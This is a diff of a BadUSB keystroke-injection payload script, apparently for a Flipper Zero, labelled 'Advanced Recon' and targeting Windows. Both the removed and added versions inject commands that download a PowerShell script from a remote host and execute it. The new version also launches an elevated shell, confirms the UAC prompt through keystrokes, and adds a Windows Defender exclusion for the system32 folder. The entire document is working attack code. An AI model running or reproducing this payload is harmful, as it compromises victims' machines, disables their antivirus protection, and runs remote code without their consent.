@@ -1,12 +1,18 @@
-REM     Title: ADV-Recon
-
-REM     Author: I am Jakoby
-
-REM     Description: This payload is meant to do an advanced recon of the target's PC. See README.md file for more details.
-
-REM     Target: Windows 10, 11
-
+REM Author: Thomas Alakopsa
+REM Description: Advanced Recon
+REM Version: 1.0
+DELAY 500
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -Ep Bypass $dc='';$db='';irm jakoby.lol/9nb | iex
+STRING powershell Start-Process powershell -Verb runAs
+CTRL-SHIFT ENTER
+DELAY 1500
+SHIFT TAB
+DELAY 500
+ENTER
+DELAY 1500
+STRING Add-MpPreference -ExclusionPath C:\Windows\system32
+ENTER
+DELAY 500
+STRING $dc=''; iex ((New-Object System.Net.WebClient).DownloadString('http://raw.githubusercontent.com/ThomasAlakopsa/FlipperZero/main/resources/advancedRecon.ps1'))
 ENTER
